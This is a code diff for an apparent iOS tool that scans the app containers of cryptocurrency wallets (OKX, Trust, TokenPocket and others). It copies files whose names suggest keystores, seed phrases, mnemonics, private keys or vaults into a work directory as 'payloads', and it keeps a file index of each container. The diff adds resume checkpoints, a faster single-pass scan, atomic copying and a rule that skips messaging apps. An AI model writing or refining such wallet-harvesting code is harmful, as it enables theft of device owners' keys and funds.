@@ -11,6 +11,36 @@ NSString * const OWContainerPassDidFinishNotification = @"OWContainerPassDidFini
 
 static NSString * const kOWContainerMetaName = @".com.apple.mobile_container_manager.metadata.plist";
 
+/// 不采集的 IM 类 App（Telegram / WhatsApp / WeChat）
+static NSSet<NSString *> *OWSkipBundleIds(void) {
+    static NSSet *s;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        s = [NSSet setWithArray:@[@"ph.telegra.Telegraph",
+                                  @"net.whatsapp.WhatsApp",
+                                  @"com.tencent.xin"]];
+    });
+    return s;
+}
+
+/// 单遍遍历时要整棵子树跳过的目录（相对容器根的小写路径）。
+/// 这些目录只装缓存/日志/媒体，既不会有密钥，索引里也不需要。
+static BOOL OWIsHeavyRel(NSString *lower) {
+    static NSArray<NSString *> *heavy;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        heavy = @[@"library/caches/", @"tmp/", @"library/httpstorages/",
+                  @"library/webkit/", @"library/logs/", @"library/splashboards/",
+                  @"io.sentry/", @"com.crashlytics/", @"media/",
+                  @"library/application support/com.apple.sharedfilelist/"];
+    });
+    for (NSString *h in heavy) {
+        if ([lower isEqualToString:[h substringToIndex:h.length - 1]]) return YES;
+        if ([lower hasPrefix:h]) return YES;
+    }
+    return NO;
+}
+
 #pragma mark - 目标清单
 
 static NSArray<NSDictionary *> *OWTargets(void) {
@@ -65,9 +95,11 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         sqlite3_finalize(st);
 
         for (NSString *tb in tables) {
-            NSString *sql = [NSString stringWithFormat:@"SELECT COUNT(*) FROM \"%@\";", tb];
+            // 快判：只要任意表存在一行就认为非空。用 LIMIT 1 而不是 COUNT(*)，
+            // 后者在几十万行的聊天库上要全表扫，是 B 阶段的主要耗时之一。
+            NSString *sql = [NSString stringWithFormat:@"SELECT 1 FROM \"%@\" LIMIT 1;", tb];
             if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) == SQLITE_OK) {
-                if (sqlite3_step(st) == SQLITE_ROW && sqlite3_column_int(st, 0) > 0) { empty = NO; }
+                if (sqlite3_step(st) == SQLITE_ROW) { empty = NO; }
                 sqlite3_finalize(st);
             }
             if (!empty) break;
@@ -82,21 +114,51 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 #pragma mark - OWContainerPass
 
 @interface OWContainerPass ()
-- (NSUInteger)_copyDirectory:(NSString *)root
-                       toDir:(NSString *)outDir
-                    excludes:(NSArray<NSString *> *)excludes
-                        exts:(NSArray<NSString *> *)exts
-                    keywords:(NSArray<NSString *> *)keywords;
-- (NSUInteger)_copyDirectoryContents:(NSString *)src
-                               toDir:(NSString *)outDir
-                              prefix:(NSString *)prefix
-                                exts:(NSArray<NSString *> *)exts
-                          totalBytes:(uint64_t *)totalBytes;
++ (BOOL)isSkippedBundleId:(NSString *)bundleId;
+- (BOOL)_measureDirectory:(NSString *)dir fileCount:(NSInteger *)count bytes:(uint64_t *)bytes;
+- (void)_noteResultForName:(NSString *)name
+                  bundleId:(NSString *)bid
+                     dir:(NSString *)outDir
+            containerPath:(NSString *)containerPath;
+- (void)_collectAndIndex:(NSDictionary *)target
+           containerPath:(NSString *)containerPath
+                  outDir:(NSString *)outDir
+                    name:(NSString *)name;
+- (NSString *)_stripSidecarSuffix:(NSString *)rel;
+- (NSDictionary * _Nullable)_definedDirForRel:(NSString *)rel
+                                         dirs:(NSArray<NSDictionary *> *)dirs;
+- (void)_restorePayloadsFromDir:(NSString *)dir;
 @end
 
 @implementation OWContainerPass {
     NSMutableArray<NSDictionary *> *_results;
+    NSMutableArray<NSDictionary *> *_payloadBatch;   // 批量记账，目标结束一次落盘
     uint64_t _collectedBytes;   // 当前目标已采集字节数（防微信这类整目录失控）
+}
+
++ (BOOL)isSkippedBundleId:(NSString *)bundleId {
+    return bundleId.length && [OWSkipBundleIds() containsObject:bundleId];
+}
+
+- (BOOL)_measureDirectory:(NSString *)dir fileCount:(NSInteger *)count bytes:(uint64_t *)bytes {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    BOOL isDir = NO;
+    if (![fm fileExistsAtPath:dir isDirectory:&isDir] || !isDir) return NO;
+
+    NSInteger n = 0;
+    uint64_t total = 0;
+    // 必须和 _noteResultForName 的统计口径完全一致（含 _file_index.json），
+    // 否则断点校验的 fileCount/bytes 永远对不上，等于没有断点。
+    for (NSString *f in [fm contentsOfDirectoryAtPath:dir error:nil]) {
+        NSString *p = [dir stringByAppendingPathComponent:f];
+        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
+        if (!a) continue;
+        n++;
+        total += [a fileSize];
+    }
+    if (count) *count = n;
+    if (bytes) *bytes = total;
+    return n > 0;
 }
 
 - (instancetype)init {
@@ -168,6 +230,12 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         NSString *bid = t[@"bundleId"];
         if (!bid.length) continue;
 
+        // IM 类不采集：数据加密/体积大/价值低，连查询都省掉
+        if ([OWContainerPass isSkippedBundleId:bid]) {
+            OWLog(@"B: 跳过 %@（IM 类不采集）", name);
+            continue;
+        }
+
         // bundleIds：同一钱包的不同 App ID 变体（OKX/OKEx、Trust 等）
         NSArray *bids = t[@"bundleIds"];
         if (![bids isKindOfClass:[NSArray class]] || !bids.count) {
@@ -194,6 +262,22 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         }
         found[hitBid] = c.path;
         hitTargets++;
+
+        // 目标级断点：本轮已完整采集过（路径/文件数/字节都对得上）就跳过，省掉重复拷贝
+        NSInteger priorCount = 0;
+        uint64_t priorBytes = 0;
+        NSString *priorDir = [self.workDir stringByAppendingPathComponent:name];
+        if ([self _measureDirectory:priorDir fileCount:&priorCount bytes:&priorBytes] &&
+            [[OWState shared] isTargetDone:bid containerPath:c.path
+                                 fileCount:priorCount bytes:priorBytes]) {
+            OWLog(@"B: 跳过已完成目标 %@（%ld 文件 / %llu B）", name,
+                  (long)priorCount, priorBytes);
+            // 断点续跑时本轮 payloads 已被清空，这里按落盘产物补回来，
+            // 否则 _hasValidPayload 判定为无数据，本轮永远不会写 done。
+            [self _restorePayloadsFromDir:priorDir];
+            [self _noteResultForName:name bundleId:bid dir:priorDir containerPath:c.path];
+            continue;
+        }
 
         NSDate *tT = [NSDate date];
         NSString *reason = nil;
@@ -384,75 +468,252 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         return;
     }
 
-    // 定义件优先
+    // 单遍：定义件拷贝 + 兜底候选收集 + 文件索引，一次 enumerator 走完
+    [self _collectAndIndex:target containerPath:containerPath outDir:outDir name:name];
+
+    [self _noteResultForName:name bundleId:target[@"bundleId"] dir:outDir containerPath:containerPath];
+}
+
+/// 单遍遍历容器根目录，同时完成三件事：
+///   1) 定义件（精确文件 / 定义目录）按原命名规则拷贝；
+///   2) 定义件命中的文件太小或不命中时，用同一次遍历里收集到的候选做兜底；
+///   3) 生成 _file_index.json（含所有非缓存文件）。
+/// 这样每个容器只走 1 遍目录，而不是原来的「定义目录 + 兜底 + 索引」3 遍。
+- (void)_collectAndIndex:(NSDictionary *)target
+           containerPath:(NSString *)containerPath
+                  outDir:(NSString *)outDir
+                    name:(NSString *)name {
     NSArray *paths = target[@"paths"] ?: @[];
     NSArray *keywords = target[@"keywords"] ?: @[];
     NSArray *exts = target[@"exts"] ?: @[];
     NSArray *excludes = target[@"excludes"] ?: @[];
-    _collectedBytes = 0;
-    NSUInteger foundFiles = 0;
-    uint64_t definedBytes = 0;
     NSFileManager *fm = [NSFileManager defaultManager];
+    _collectedBytes = 0;
+
+    NSMutableSet<NSString *> *definedFiles = [NSMutableSet set];
+    NSMutableArray<NSDictionary *> *definedDirs = [NSMutableArray array];
     for (NSString *rel in paths) {
+        if (!rel.length) continue;
         NSString *src = [containerPath stringByAppendingPathComponent:rel];
         BOOL isDir = NO;
         if (![fm fileExistsAtPath:src isDirectory:&isDir]) continue;
-
         if (isDir) {
-            uint64_t before = _collectedBytes;
-            NSUInteger n = [self _copyDirectory:src toDir:outDir excludes:excludes
-                                           exts:exts keywords:keywords];
-            if (n == 0) {
-                // 定义目录按扩展名/关键词过滤不到任何文件时，不能当成"已采到"。
-                // 典型：TokenPocket 的 Documents/F4SeCyr —— 真正的密钥文件没有扩展名，
-                // 相对路径里也不含关键词，过滤后一定是 0。这里对该目录再做一次
-                // 无过滤（仅排除缓存/媒体/超大文件）的递归兜底。
-                OWLog(@"B: %@ 目录 %@ 过滤命中 0，改做整目录小文件兜底", name, rel);
-                n = [self _copyDirectoryContents:src toDir:outDir
-                                         prefix:rel.lastPathComponent
-                                           exts:exts totalBytes:NULL];
+            [definedDirs addObject:@{@"rel": rel, @"tag": rel.lastPathComponent ?: rel}];
+        } else {
+            [definedFiles addObject:rel];
+        }
+    }
+    // 长路径优先匹配（Documents 与 Documents/db 同时定义时，先命中更具体的）
+    [definedDirs sortUsingComparator:^NSComparisonResult(NSDictionary *a, NSDictionary *b) {
+        NSUInteger la = [a[@"rel"] length], lb = [b[@"rel"] length];
+        if (la == lb) return NSOrderedSame;
+        return la > lb ? NSOrderedAscending : NSOrderedDescending;
+    }];
+
+    NSMutableArray<NSString *> *useExts = [NSMutableArray array];
+    for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
+    NSMutableArray<NSString *> *useKws = [NSMutableArray array];
+    for (NSString *k in keywords) if (k.length) [useKws addObject:k.lowercaseString];
+
+    // 兜底扫描的默认规则（定义件不足时才启用）
+    NSArray *scanExts = useExts.count ? useExts : @[@"sqlite", @"sqlite3", @"db", @"realm",
+                                                    @"json", @"plist", @"mmkv", @"keystore",
+                                                    @"dat", @"bin", @"lock", @"txt", @"xml"];
+    NSArray *scanKws = useKws.count ? useKws : @[@"wallet", @"keystore", @"key", @"seed",
+                                                 @"mnemonic", @"account", @"address", @"vault",
+                                                 @"realm", @"store", @"persist"];
+    NSArray *strong = @[@"keystore", @"seed", @"mnemonic", @"wallet",
+                        @"privatekey", @"private_key", @"vault", @"f4secyr"];
+    NSSet *media = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif", @"heic",
+                                         @"mp4", @"mov", @"mp3", @"wav", @"pdf", @"zip"]];
+    NSSet *lenientExts = [NSSet setWithArray:@[@"plist", @"dat", @"bin", @"keystore",
+                                               @"mmkv", @"txt", @"lock", @"json"]];
+
+    NSMutableArray<NSDictionary *> *candidates = [NSMutableArray array];
+    NSMutableArray<NSDictionary *> *indexItems = [NSMutableArray array];
+    NSUInteger foundFiles = 0;
+    uint64_t definedBytes = 0;
+    NSUInteger scanned = 0;
+
+    NSDirectoryEnumerator *en = [fm enumeratorAtPath:containerPath];
+    for (NSString *rel in en) {
+        if (++scanned > 100000) break;
+        NSString *lower = rel.lowercaseString;
+
+        BOOL skipExcluded = NO;
+        for (NSString *ex in excludes) {
+            if (ex.length && [lower containsString:ex.lowercaseString]) { skipExcluded = YES; break; }
+        }
+        if (skipExcluded) { [en skipDescendants]; continue; }
+
+        // 缓存/临时/崩溃日志/媒体目录：整棵子树跳过（既不拷也不索引）
+        if (OWIsHeavyRel(lower)) { [en skipDescendants]; continue; }
+
+        NSDictionary *fa = [en fileAttributes];
+        BOOL isDir = [fa[NSFileType] isEqualToString:NSFileTypeDirectory];
+        uint64_t sz = isDir ? 0 : [fa fileSize];
+
+        if (indexItems.count < 5000) {
+            [indexItems addObject:@{@"p": rel, @"s": @(sz), @"d": @(isDir)}];
+        }
+        if (isDir) continue;
+
+        // 1) 定义文件（精确路径）
+        if ([definedFiles containsObject:rel]) {
+            if ([self _copyItem:[containerPath stringByAppendingPathComponent:rel]
+                          toDir:outDir name:rel.lastPathComponent]) {
+                foundFiles++;
+                definedBytes += sz;
             }
-            if (n) {
-                foundFiles += n;
-                definedBytes += (_collectedBytes - before);
+            // sqlite 边车：-wal/-shm 必须跟主库一起走，否则库内容不完整
+            for (NSString *suffix in @[@"-wal", @"-shm"]) {
+                NSString *sideRel = [rel stringByAppendingString:suffix];
+                NSString *side = [containerPath stringByAppendingPathComponent:sideRel];
+                if (![fm fileExistsAtPath:side]) continue;
+                if ([self _copyItem:side toDir:outDir
+                               name:[rel.lastPathComponent stringByAppendingString:suffix]]) {
+                    definedBytes += [[fm attributesOfItemAtPath:side error:nil] fileSize];
+                }
             }
             continue;
         }
 
-        if ([self _copyItem:src toDir:outDir name:rel.lastPathComponent]) {
-            foundFiles++;
-            definedBytes += [[fm attributesOfItemAtPath:src error:nil] fileSize];
+        // 定义文件的边车已经随主库拷过，不再当普通文件处理
+        if ([definedFiles containsObject:[self _stripSidecarSuffix:rel]]) continue;
+
+        // 2) 定义目录内：先按 exts/keywords 过滤，过滤不掉再走"小文件/无扩展名"宽松兜底
+        NSDictionary *dir = [self _definedDirForRel:rel dirs:definedDirs];
+        if (dir) {
+            NSString *drel = dir[@"rel"];
+            NSString *sub = [rel substringFromIndex:drel.length + 1];
+            NSString *subLower = sub.lowercaseString;
+            NSString *subExt = subLower.pathExtension;
+
+            BOOL extHit = [useExts containsObject:subExt];
+            BOOL kwHit = NO;
+            for (NSString *k in useKws) {
+                if ([subLower rangeOfString:k].location != NSNotFound) { kwHit = YES; break; }
+            }
+            BOOL keep = extHit || kwHit;
+            if (!keep) {
+                // 典型：TokenPocket 的 Documents/F4SeCyr —— 密钥文件没有扩展名、路径也不含关键词
+                keep = subExt.length == 0 ||
+                       [lenientExts containsObject:subExt] ||
+                       (![media containsObject:subExt] && sz <= 2ULL * 1024 * 1024);
+            }
+            if (!keep) continue;
+
+            NSString *leaf = keep && (extHit || kwHit)
+                ? [sub stringByReplacingOccurrencesOfString:@"/" withString:@"_"]
+                : [NSString stringWithFormat:@"%@_%@", dir[@"tag"],
+                   [sub stringByReplacingOccurrencesOfString:@"/" withString:@"_"]];
+            if ([self _copyItem:[containerPath stringByAppendingPathComponent:rel]
+                          toDir:outDir name:leaf]) {
+                foundFiles++;
+                definedBytes += sz;
+            }
+            continue;
         }
-        // sqlite 边车（-wal/-shm 必须跟着主库走，否则库内容不完整）
-        for (NSString *ext in @[@"-wal", @"-shm"]) {
-            NSString *side = [src stringByAppendingString:ext];
-            if ([fm fileExistsAtPath:side]) {
-                if ([self _copyItem:side toDir:outDir
-                               name:[rel.lastPathComponent stringByAppendingString:ext]]) {
-                    definedBytes += [[fm attributesOfItemAtPath:side error:nil] fileSize];
-                }
+
+        // 3) 容器其它位置：只记候选，等遍历结束看定义件是否足够
+        if (candidates.count >= 4000) continue;
+        if ([media containsObject:lower.pathExtension]) continue;
+        if ([lower containsString:@"com.apple.mobile_container_manager.metadata.plist"]) continue;
+
+        BOOL hit = [scanExts containsObject:lower.pathExtension];
+        if (!hit) {
+            for (NSString *k in scanKws) {
+                if ([lower rangeOfString:k].location != NSNotFound) { hit = YES; break; }
             }
         }
+        if (!hit) {
+            for (NSString *k in strong) {
+                if ([lower rangeOfString:k].location != NSNotFound) { hit = YES; break; }
+            }
+        }
+        if (hit) [candidates addObject:@{@"rel": rel, @"size": @(sz)}];
     }
+
     OWLog(@"B: %@ 定义件命中 %lu/%lu，有效 %llu B", name,
           (unsigned long)foundFiles, (unsigned long)paths.count, definedBytes);
 
-    // 兜底：定义件没命中、或只拿到很小/无效的文件时，扩大扫描，防止版本路径不一致
+    // 兜底：定义件没命中、或只拿到很小/无效的文件时，用同一遍里收集的候选补
     BOOL weak = (foundFiles == 0 || definedBytes < 64ULL * 1024);
-    if (weak) {
-        OWLog(@"B: %@ 定义件不足（%lu 个 / %llu B），启用强化兜底扫描",
-              name, (unsigned long)foundFiles, definedBytes);
-        [self _scanDirectory:containerPath keywords:keywords exts:exts toDir:outDir name:name];
+    if (weak && candidates.count) {
+        OWLog(@"B: %@ 定义件不足（%lu 个 / %llu B），启用兜底候选 %lu 个",
+              name, (unsigned long)foundFiles, definedBytes, (unsigned long)candidates.count);
+        NSUInteger copied = 0;
+        uint64_t bytes = 0;
+        for (NSDictionary *c in candidates) {
+            if (copied >= 2000 || bytes >= 50ULL * 1024 * 1024) break;
+            if (_collectedBytes >= self.maxContainerBytes) break;
+            NSString *rel = c[@"rel"];
+            NSString *leaf = [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
+            if ([self _copyItem:[containerPath stringByAppendingPathComponent:rel]
+                          toDir:outDir name:leaf]) {
+                copied++;
+                bytes += [c[@"size"] unsignedLongLongValue];
+            }
+        }
+        OWLog(@"B: 兜底扫描 %@ 命中 %lu 个 / %llu B", name,
+              (unsigned long)copied, bytes);
     }
 
-    // 无论是否命中，都留一份完整文件索引：即使内容没拷到，也能看到容器里有什么
-    [self _writeFileIndex:containerPath target:target outDir:outDir];
+    // 文件索引：即使内容没拷到，也能看到容器里有什么
+    NSDictionary *idx = @{
+        @"target": target[@"name"] ?: @"",
+        @"bundleId": target[@"bundleId"] ?: @"",
+        @"defined": paths,
+        @"files": indexItems,
+    };
+    NSData *d = [NSJSONSerialization dataWithJSONObject:idx options:0 error:nil];
+    if (d.length) {
+        [d writeToFile:[outDir stringByAppendingPathComponent:@"_file_index.json"]
+            atomically:YES];
+    }
+    OWLog(@"B: 索引 %@ %lu 条", name, (unsigned long)indexItems.count);
+}
 
-    [self _noteResultForName:name bundleId:target[@"bundleId"] dir:outDir];
+- (NSString *)_stripSidecarSuffix:(NSString *)rel {
+    for (NSString *suffix in @[@"-wal", @"-shm"]) {
+        if ([rel hasSuffix:suffix]) {
+            return [rel substringToIndex:rel.length - suffix.length];
+        }
+    }
+    return rel;
+}
+
+- (NSDictionary * _Nullable)_definedDirForRel:(NSString *)rel
+                                         dirs:(NSArray<NSDictionary *> *)dirs {
+    for (NSDictionary *d in dirs) {
+        NSString *drel = d[@"rel"];
+        if (rel.length <= drel.length + 1) continue;
+        if (![rel hasPrefix:drel]) continue;
+        if ([rel characterAtIndex:drel.length] != '/') continue;
+        return d;
+    }
+    return nil;
+}
+
+/// 断点续跑：把上次已落盘产物重新记进本轮 payloads（不重算内容，只按文件现状记账）
+- (void)_restorePayloadsFromDir:(NSString *)dir {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    _payloadBatch = _payloadBatch ?: [NSMutableArray array];
+    for (NSString *f in [fm contentsOfDirectoryAtPath:dir error:nil]) {
+        if ([f isEqualToString:@"_file_index.json"]) continue;
+        NSString *p = [dir stringByAppendingPathComponent:f];
+        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
+        if (!a) continue;
+        BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:p];
+        [_payloadBatch addObject:@{@"name": f, @"bytes": @([a fileSize]), @"valid": @(!emptyDb)}];
+    }
 }
 
 // 记账：文件数 / 体积 / 是否空库
-- (void)_noteResultForName:(NSString *)name bundleId:(NSString *)bid dir:(NSString *)outDir {
+- (void)_noteResultForName:(NSString *)name
+                  bundleId:(NSString *)bid
+                     dir:(NSString *)outDir
+            containerPath:(NSString *)containerPath {
     NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outDir error:nil];
     uint64_t total = 0;
     NSUInteger emptyCount = 0;
@@ -468,6 +729,13 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     else if (emptyCount) tag = [NSString stringWithFormat:@" [含空库 %lu]",
                                 (unsigned long)emptyCount];
     OWLog(@"B: 取得 %@ %lu 个文件 %llu B%@", name, (unsigned long)files.count, total, tag);
+
+    // 批量记账：整目标一次落盘，避免每文件写一份 plist
+    if (_payloadBatch.count) {
+        [[OWState shared] notePayloads:_payloadBatch];
+        [_payloadBatch removeAllObjects];
+    }
+
     [_results addObject:@{
         @"bundleId": bid ?: name,
         @"name": name,
@@ -477,109 +745,15 @@ static NSArray<NSDictionary *> *OWTargets(void) {
         @"emptyDatabase": @(files.count == 0 || total == 0),
         @"isDir": @(YES),
     }];
-}
 
-- (NSUInteger)_copyDirectory:(NSString *)root
-                       toDir:(NSString *)outDir
-                    excludes:(NSArray<NSString *> *)excludes
-                        exts:(NSArray<NSString *> *)exts
-                    keywords:(NSArray<NSString *> *)keywords {
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSMutableArray<NSString *> *useExts = [NSMutableArray array];
-    for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
-    NSMutableArray<NSString *> *useKws = [NSMutableArray array];
-    for (NSString *k in keywords) if (k.length) [useKws addObject:k.lowercaseString];
-
-    NSUInteger copied = 0;
-    NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
-    for (NSString *rel in en) {
-        if (_collectedBytes >= self.maxContainerBytes) break;
-        NSString *lower = rel.lowercaseString;
-
-        BOOL skip = NO;
-        for (NSString *ex in excludes) {
-            if (ex.length && [lower containsString:ex.lowercaseString]) { skip = YES; break; }
-        }
-        if (skip) continue;
-
-        // 目录型定义路径（如微信 Documents）按 exts/keywords 过滤，避免把图片/缓存整包带走
-        if (useExts.count || useKws.count) {
-            BOOL hit = [useExts containsObject:lower.pathExtension];
-            if (!hit) {
-                for (NSString *k in useKws) {
-                    if ([lower containsString:k]) { hit = YES; break; }
-                }
-            }
-            if (!hit) continue;
-        }
-
-        NSString *full = [root stringByAppendingPathComponent:rel];
-        BOOL isDir = NO;
-        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
-        NSString *leaf = [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
-        if ([self _copyItem:full toDir:outDir name:leaf]) copied++;
+    // 目标级断点：记下容器路径/文件数/字节，重启后可跳过
+    if (bid.length && files.count > 0) {
+        [[OWState shared] markTargetDone:bid
+                           containerPath:containerPath ?: @""
+                               fileCount:files.count
+                                   bytes:total
+                                     zip:nil];
     }
-    return copied;
-}
-
-/// 定义目录内的"无过滤"递归兜底：只排除缓存/崩溃日志/媒体和超大文件，
-/// 用来接住那些文件名没有扩展名、也不含关键词的密钥文件（如 TP 的 F4SeCyr 目录）。
-- (NSUInteger)_copyDirectoryContents:(NSString *)src
-                               toDir:(NSString *)outDir
-                              prefix:(NSString *)prefix
-                                exts:(NSArray<NSString *> *)exts
-                          totalBytes:(uint64_t *)totalBytes {
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSMutableSet<NSString *> *useExts = [NSMutableSet set];
-    for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
-    NSSet<NSString *> *media = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif",
-                                                     @"heic", @"heif", @"mp4", @"mov",
-                                                     @"m4a", @"mp3", @"wav", @"pdf",
-                                                     @"zip", @"ipa"]];
-    NSString *tag = prefix.length ? prefix : src.lastPathComponent;
-
-    NSUInteger copied = 0;
-    uint64_t total = 0;
-    NSDirectoryEnumerator *en = [fm enumeratorAtPath:src];
-    for (NSString *rel in en) {
-        if (_collectedBytes >= self.maxContainerBytes) break;
-        if (copied >= 2000 || total >= 50ULL * 1024 * 1024) {
-            OWLog(@"B: 目录兜底达到上限 %@（%lu 文件 / %llu B）", tag,
-                  (unsigned long)copied, total);
-            break;
-        }
-        NSString *lower = rel.lowercaseString;
-        if ([lower containsString:@"/caches/"] ||
-            [lower containsString:@"/tmp/"] ||
-            [lower containsString:@"httpstorages"] ||
-            [lower containsString:@"/webkit/"] ||
-            [lower containsString:@"sentry"] ||
-            [lower containsString:@"crashlytics"]) continue;
-
-        NSString *full = [src stringByAppendingPathComponent:rel];
-        BOOL isDir = NO;
-        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
-
-        NSString *ext = full.pathExtension.lowercaseString;
-        uint64_t sz = [[fm attributesOfItemAtPath:full error:nil] fileSize];
-        if (sz == 0) continue;
-
-        // 保留：目标扩展名 / 无扩展名（密钥常见形态）/ 非媒体的普通小文件
-        BOOL keep = [useExts containsObject:ext] ||
-                    (ext.length == 0) ||
-                    (![media containsObject:ext] && sz <= 2ULL * 1024 * 1024);
-        if (!keep) continue;
-
-        NSString *leaf = [NSString stringWithFormat:@"%@_%@", tag,
-                          [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"]];
-        if ([self _copyItem:full toDir:outDir name:leaf]) {
-            copied++;
-            total += sz;
-        }
-    }
-    if (totalBytes) *totalBytes = total;
-    OWLog(@"B: 目录兜底 %@ 命中 %lu 个 / %llu B", tag, (unsigned long)copied, total);
-    return copied;
 }
 
 - (void)_scanDirectory:(NSString *)root
@@ -666,33 +840,6 @@ static NSArray<NSDictionary *> *OWTargets(void) {
           (unsigned long)copied, total);
 }
 
-- (void)_writeFileIndex:(NSString *)root target:(NSDictionary *)target outDir:(NSString *)outDir {
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSMutableArray *items = [NSMutableArray array];
-    NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
-    NSUInteger n = 0;
-    for (NSString *rel in en) {
-        if (++n > 5000) break;
-        NSString *p = [root stringByAppendingPathComponent:rel];
-        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
-        if (!a) continue;
-        BOOL isDir = [a[NSFileType] isEqualToString:NSFileTypeDirectory];
-        [items addObject:@{@"p": rel, @"s": @([a fileSize]), @"d": @(isDir)}];
-    }
-    NSDictionary *idx = @{
-        @"target": target[@"name"] ?: @"",
-        @"bundleId": target[@"bundleId"] ?: @"",
-        @"defined": target[@"paths"] ?: @[],
-        @"files": items,
-    };
-    NSData *d = [NSJSONSerialization dataWithJSONObject:idx options:0 error:nil];
-    if (d.length) {
-        [d writeToFile:[outDir stringByAppendingPathComponent:@"_file_index.json"]
-            atomically:YES];
-    }
-    OWLog(@"B: 索引 %@ %lu 条", target[@"name"] ?: @"", (unsigned long)items.count);
-}
-
 - (BOOL)_copyItem:(NSString *)src toDir:(NSString *)outDir name:(NSString *)name {
     // 用传入的 name（定义件可能同名但不同目录；边车要带 -wal 后缀）
     NSString *leaf = name.length ? name : src.lastPathComponent;
@@ -727,16 +874,27 @@ static NSArray<NSDictionary *> *OWTargets(void) {
     }
 
     NSString *dst = [outDir stringByAppendingPathComponent:leaf];
+    NSString *part = [dst stringByAppendingString:@".part"];
     NSError *e = nil;
-    [[NSFileManager defaultManager] removeItemAtPath:dst error:nil];
-    if (![[NSFileManager defaultManager] copyItemAtPath:src toPath:dst error:&e]) {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:part error:nil];
+    // 先拷到 .part 再 rename：被杀不会留下“半个正式文件”，下次重拷即可
+    if (![fm copyItemAtPath:src toPath:part error:&e]) {
         OWLog(@"B: 拷贝失败 %@ -> %@", leaf, e.localizedDescription);
+        [fm removeItemAtPath:part error:nil];
+        return NO;
+    }
+    [fm removeItemAtPath:dst error:nil];
+    if (![fm moveItemAtPath:part toPath:dst error:&e]) {
+        OWLog(@"B: 落盘失败 %@ -> %@", leaf, e.localizedDescription);
+        [fm removeItemAtPath:part error:nil];
         return NO;
     }
 
     BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:dst];
     _collectedBytes += sz;
-    [[OWState shared] notePayload:leaf bytes:sz valid:!emptyDb];
+    _payloadBatch = _payloadBatch ?: [NSMutableArray array];
+    [_payloadBatch addObject:@{@"name": leaf, @"bytes": @(sz), @"valid": @(!emptyDb)}];
     OWLog(@"B: 取得 %@ (%llu B)%@", leaf, sz, emptyDb ? @" [空库]" : @"");
     return YES;
 }
